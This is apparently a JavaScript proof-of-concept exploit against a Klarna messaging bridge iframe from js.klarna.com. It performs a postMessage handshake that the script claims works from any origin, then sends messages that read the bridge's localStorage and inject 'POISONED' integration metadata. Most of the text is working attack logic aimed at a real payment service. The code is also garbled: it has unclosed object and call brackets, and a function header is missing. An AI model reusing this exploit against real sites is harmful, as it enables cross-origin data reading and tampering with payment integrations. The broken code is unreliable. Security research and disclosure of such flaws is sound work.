function log(msg) { out.textContent += '\n' + msg; }

let port;

iframe.onload = () => {
  log('[+] Step 1: Bridge iframe loaded from js.klarna.com');
  const channel = new MessageChannel();
  port = channel.port1;

  port.onmessage = handleMessage;

  iframe.contentWindow.postMessage(
    { type: 'klarna_initialize_messenger_handshake' },
    'https://js.klarna.com',
    [channel.port2]

  log('[*] Handshake sent — waiting for response...');
};

let step = 0;
function handleMessage(e) {
  if (e.data === 'klarna_initialize_messenger_handshake_complete') {
    log('\n[!!!] HANDSHAKE COMPLETE!');
    log('      Origin accepted: ' + window.location.origin);
    log('      -> validateOrigin:false bypasses ALL origin checks');
    log('      -> Any website on the internet can reach this point\n');
    runTests();
  } else if (e.data && e.data.messageId) {
    handleResponse(e.data);
  }
}

const tests = [
  {
    name: 'READ js.klarna.com localStorage (version key)',
    msg: { messageId: 't1', method: 'getStorageItem', data: { key: '__klarna_sdk_version' } }

  {
    name: 'CALL setIntegrationMetadata (metadata poisoning)',
    msg: { messageId: 't6', method: 'setIntegrationMetadata', data: { version: 'POISONED', environment: 'production' } }

  const test = tests[testIndex++];
  log('[*] Test ' + testIndex + ': ' + test.name);
  port.postMessage(test.msg);
}

function handleResponse(data) {
  const val = data.resolve !== undefined ? JSON.stringify(data.resolve) : JSON.stringify(data);
  log('    -> Response: ' + val);

}
